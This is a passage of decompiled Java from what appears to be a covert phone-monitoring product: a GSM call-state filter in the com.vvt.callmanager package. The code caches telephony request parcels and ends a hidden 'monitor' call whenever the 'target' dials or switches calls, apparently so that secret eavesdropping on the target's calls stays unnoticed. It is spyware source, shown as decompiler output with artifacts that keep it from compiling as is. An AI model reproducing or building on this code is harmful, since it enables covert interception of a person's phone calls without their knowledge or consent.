        localObject2 = paramParcel.marshall();
        localObject1[0] = localObject2;
        a(k);
        localObject3 = this.mFilterCall;
        localObject1 = new com/vvt/callmanager/ref/MonitorDisconnectData;
        localObject2 = this.monitorCallInfo.d();
        localObject4 = MonitorDisconnectData.Reason.SWITCH_CALL;
        ((MonitorDisconnectData)localObject1).<init>((String)localObject2, (MonitorDisconnectData.Reason)localObject4);
        FilterGsmCall.a((FilterGsmCall)localObject3, (MonitorDisconnectData)localObject1);
      }
      else if (n == i)
      {
        localObject1 = this.cacheRequest[0];
        if (localObject1 != null)
        {
          localObject1 = this.cacheRequest[0];
          i1 = localObject1.length;
          if (i1 > j)
          {
            n = localObject1[j];
            if (n == i) {
              n = k;
            }
          }
          for (;;)
          {
            if (n == 0) {
              break label315;
            }
            localObject3 = this.cacheRequest;
            localObject1 = paramParcel.marshall();
            localObject3[0] = localObject1;
            break;
            n = 0;
            localObject1 = null;
          }
          label315:
          localObject1 = this.cacheRequest;
          localObject2 = paramParcel.marshall();
          localObject1[k] = localObject2;
        }
        else
        {
          localObject3 = this.cacheRequest;
          localObject1 = paramParcel.marshall();
          localObject3[0] = localObject1;
        }
      }
      else
      {
        i1 = 10;
        if (n == i1)
        {
          localObject1 = this.cacheRequest[0];
          if (localObject1 == null)
          {
            localObject1 = this.cacheRequest;
            localObject2 = paramParcel.marshall();
            localObject1[0] = localObject2;
          }
          for (;;)
          {
            boolean bool1 = this.isReleasingMonitor;
            if (!bool1)
            {
              a(k);
              localObject1 = this.mFilterCall;
              localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
              localObject4 = this.monitorCallInfo.d();
              MonitorDisconnectData.Reason localReason = MonitorDisconnectData.Reason.DIALING;
              ((MonitorDisconnectData)localObject2).<init>((String)localObject4, localReason);
              FilterGsmCall.a((FilterGsmCall)localObject1, (MonitorDisconnectData)localObject2);
            }
            this.targetIsDialing = k;
            break;
            localObject1 = this.cacheRequest[k];
            if (localObject1 == null)
            {
              localObject1 = this.cacheRequest;
              localObject2 = paramParcel.marshall();
              localObject1[k] = localObject2;
            }
            else
            {
              localObject1 = this.cacheRequest;
              i1 = 2;
              localObject4 = paramParcel.marshall();
              localObject1[i1] = localObject4;
            }
          }
        }
        m = k;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$8.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */